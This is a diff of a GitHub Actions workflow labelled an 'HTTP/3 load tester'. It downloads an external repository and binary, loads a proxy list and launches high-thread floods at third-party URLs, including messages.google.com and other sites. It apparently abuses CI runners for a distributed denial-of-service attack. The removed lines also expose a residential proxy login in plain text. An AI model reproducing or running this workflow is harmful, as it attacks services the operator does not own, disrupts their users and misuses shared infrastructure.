@@ -20,21 +20,13 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
       
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
-        with:
-          node-version: '20'
-      
-      - name: Setup Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.10'
       
       
       
-      - name: Install Node.js dependencies
-        run: npm install  hpack chalk
-            
+      
+      
+      
+      
       - name: Run HTTP/3 load tester
         run: |
           git clone https://github.com/Fegp1p2/ideal-guide.git
@@ -42,10 +34,8 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x m
-          cd Fc-main
-          echo "geonode_DJDQT1IiE9-type-residential:5f5a9d7a-c40b-4e86-b83d-f0bf12f4594a@92.204.164.15:9000" > output.txt
-          node y.js GET  https://rebirthstress.org/6901966783-5901b879-abe0-4a3b-952f-e962a3c86ac7 300 4 90  --bfm true--debug --auth true
-          ./m https://messages.google.com/web/ 700 1 1 output.txt 
+          
+          ./m https://rapidis.gay/6901966783-4f6a7bbb-d94e-473a-8ebb-c52e7aec4fcd 700 1 1 90.txt 
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
